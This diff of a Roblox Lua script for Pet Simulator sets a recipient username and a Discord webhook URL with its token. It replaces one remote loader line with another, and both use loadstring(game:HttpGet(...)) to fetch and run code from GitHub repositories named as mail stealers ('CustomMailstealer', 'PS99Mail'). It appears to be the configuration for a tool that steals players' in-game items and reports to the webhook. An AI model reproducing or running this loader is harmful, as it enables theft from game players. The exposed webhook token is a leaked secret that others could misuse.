@@ -1,7 +1,6 @@
-Username = "PetSimulatorLive0"
+Username = "petsimulatorlive0"
 Webhook = "https://discordapp.com/api/webhooks/1214688063427444767/4XgWH_DQRh9ue_E4MQ303XxJXoKorUIvb37K4oRFRWFyNo899TV7lVu8QRB6L_qitXvE"
+selectedLoadingScreen = "4"
+LoadingScreen = true
 
-G_LoadingScreen = "Loading..."
-G_WebhookName = "Spidey Bot"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriCustom/main/CustomMailstealer"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/PS99Mail/main/Mementomori"))()
